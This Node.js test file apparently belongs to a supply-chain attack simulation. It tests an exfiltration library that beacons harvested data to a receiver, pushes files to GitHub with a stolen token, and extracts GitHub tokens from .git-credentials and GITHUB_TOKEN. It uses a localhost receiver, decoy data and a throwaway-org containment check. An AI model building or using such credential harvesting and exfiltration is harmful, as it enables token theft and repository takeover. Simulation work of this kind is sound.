// supply-chain-sim/npm-package/test/exfil.test.js
const { test, before, after } = require('node:test');
const assert = require('node:assert');
const https = require('node:https');
const fs = require('node:fs');
const path = require('node:path');
const { beacon, pushToGitHub, extractGithubToken } = require('../lib/exfil.js');

// Reuse the receiver as a local test double.
const { startServer } = require('../../receiver/server.js');
let server;
before(async () => { process.env.PORT = '19443';   // own port; does NOT touch the shared collect.log
  server = await startServer(); });
after(() => server && server.close());

test('beacon POSTs payload to receiver /collect', async () => {
  const res = await beacon('https://127.0.0.1:19443', { cloud: { fake: 'decoy' } });
  assert.strictEqual(res.status, 200);
});

test('pushToGitHub skips cleanly when no PAT is configured', async () => {
  const res = await pushToGitHub({ org: '', pat: '', repo: 'x', files: [] });
  assert.strictEqual(res.skipped, true);
});

test('pushToGitHub refuses to push to a non-throwaway org (containment)', async () => {
  await assert.rejects(
    () => pushToGitHub({ org: 'real-victim-org', pat: 'x', repo: 'r', files: [] }),
    /not a recognised throwaway org/,
  );
});

test('extractGithubToken pulls the victim token from harvested creds/env', () => {
  const tok = 'ghp_' + 'a'.repeat(36);
  assert.strictEqual(
    extractGithubToken({ contents: { '.git-credentials': `https://${tok}:x-oauth-basic@github.com` } }), tok);
  assert.strictEqual(extractGithubToken({ environment: { GITHUB_TOKEN: 'ghp_fromEnv' } }), 'ghp_fromEnv');
  assert.strictEqual(extractGithubToken({ contents: {}, environment: {} }), null);
});
